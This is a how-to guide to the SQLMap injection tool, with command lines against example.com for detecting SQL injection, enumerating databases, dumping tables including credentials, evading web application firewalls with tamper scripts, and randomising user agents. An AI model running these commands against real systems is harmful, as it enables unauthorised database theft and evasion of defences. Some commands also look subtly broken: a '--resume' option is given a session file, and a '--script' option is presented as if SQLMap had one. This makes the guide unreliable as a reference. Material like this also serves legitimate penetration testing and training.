# 🗺️ SQLMap

## In-Depth Guide

Welcome to the comprehensive guide on SQLMap, a powerful open-source penetration testing tool for detecting and exploiting SQL injection vulnerabilities. SQLMap is widely used by security professionals to automate the process of identifying and exploiting SQL injection flaws in web applications.

<figure><img src="https://upload.wikimedia.org/wikipedia/commons/4/4f/Sqlmap_logo.png" alt=""><figcaption></figcaption></figure>

### Introduction to SQLMap

#### What is SQLMap?

SQLMap is a powerful, open-source tool designed to automate the process of detecting and exploiting SQL injection vulnerabilities in web applications. It provides penetration testers and security professionals with a comprehensive set of features for identifying, assessing, and exploiting potential weaknesses related to SQL injection.

#### Key Features and Capabilities

* Automated detection of SQL injection vulnerabilities.
* Support for various database management systems (DBMS), including MySQL, PostgreSQL, MSSQL, and others.
* Capability to perform both time-based and error-based blind SQL injection attacks.
* Support for union-based and stacked queries.
* Database fingerprinting and version detection.
* Exploitation of identified vulnerabilities to extract data from databases.

### Installation

#### Downloading and Installing SQLMap

To get started with SQLMap, you can download the latest version from the official GitHub repository:

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
```

#### Basic Setup and Configuration

Before using SQLMap, it's crucial to understand the basic configuration options. This includes setting the target URL, specifying parameters, and configuring any additional options. A typical command might look like this:

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --dbs
```

### Basic Usage

#### Scanning a Target URL

The most basic usage of SQLMap involves scanning a target URL for SQL injection vulnerabilities. The `-u` option is used to specify the target URL:

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --risk=3 --level=5
```

<figure><img src="https://media.geeksforgeeks.org/wp-content/uploads/explained_columns.png" alt=""><figcaption></figcaption></figure>

**Specifying Injection Points and Parameters**

SQLMap allows you to specify injection points and parameters manually. For example, to target a specific parameter, you can use the `-p` option:

```bash
python sqlmap.py -u "http://example.com/index.php" -p id --dbs
```

### Advanced Features

#### Session Management and Stateful Testing

SQLMap supports session management, allowing you to resume an interrupted scan or continue from a previously saved state. The `--resume` option is used for this purpose:

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --cookie="PHPSESSID=12345" --resume=session.txt
```

#### Tampering with HTTP Requests and Responses

To evade detection or modify requests and responses, SQLMap provides the `--tamper` option. Custom tamper scripts can be used to modify data before it's sent to the server or after it's received:

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --tamper=space2comment
```

### Database Enumeration

#### Extracting Information about the Database

Once SQL injection vulnerabilities are identified, SQLMap allows you to extract valuable information about the database, including its version and user privileges:

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --banner
```

#### Retrieving Databases, Tables, and Columns

SQLMap supports database enumeration, allowing you to retrieve a list of databases, tables, and columns within the target system:

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --dbs
```

### Exploitation

#### Exploiting SQL Injection Vulnerabilities

Once SQLMap identifies a vulnerable parameter, you can proceed to exploit it to extract data from the database. The `--dump` option is commonly used for this purpose:

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --dump
```

#### Dumping Data from Databases

To dump specific data, such as usernames and passwords, you can use the `--columns` and `--dump` options:

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --columns --dump
```

### Detection Evasion Techniques

#### Techniques to Evade WAFs

SQLMap provides techniques to evade detection by Web Application Firewalls (WAFs). The `--tamper` option can be utilized with specific tamper scripts designed for evasion:

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --tamper=between
```

#### Anonymizing Requests

To anonymize requests and avoid blocking, SQLMap allows you to use the `--random-agent` option, which selects a random user-agent for each HTTP request:

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --random-agent
```

### Automation and Scripting

#### Creating and Using Custom Scripts

SQLMap supports custom scripts for automation and specific testing scenarios. Custom scripts can be created and utilized with the `--script` option:

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --script=my_custom_script.py
```
